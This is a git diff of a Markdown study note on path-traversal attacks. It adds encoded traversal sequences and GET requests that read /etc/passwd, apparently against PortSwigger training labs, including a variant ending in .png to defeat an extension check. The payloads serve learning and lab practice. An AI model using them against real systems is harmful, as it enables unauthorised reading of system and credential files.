@@ -24,11 +24,11 @@
 
 
 * Unix like OS: /
-* Windows : <drive letter>: , /
-* MAC OS : <drive letter>: , :
+* Windows : `<drive letter>: , /`
+* MAC OS : `<drive letter>: , :`
 * URL encoding and double URL encoding :
 ```urlencode
-%2e%2e%2f => ../
+%2e%2e%2f => ../ 
 %2e%2e/ => ../
 ..%2f => ../
 %2e%2e%5c => ..\
@@ -41,7 +41,7 @@
 ..%c0%af => ../
 ..%c1%9c => ..\
 ```
-#### Example
+#### Practrice in PortSwigger Lab
 
  ```http
  GET /image?filename=../../../etc/passwd HTTP/1.1
@@ -63,3 +63,8 @@ GET /image?filename=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e
 GET /image?filename=/var/www/images/../../../../../etc/passwd HTTP/1.1
 ```
 ![dir4](./img/dir4.png)
+
+```http
+GET /image?filename=/../../../../../../../../../../../etc/passwd.png HTTP/1.1
+```
+![dir5](./img/dir5.png)
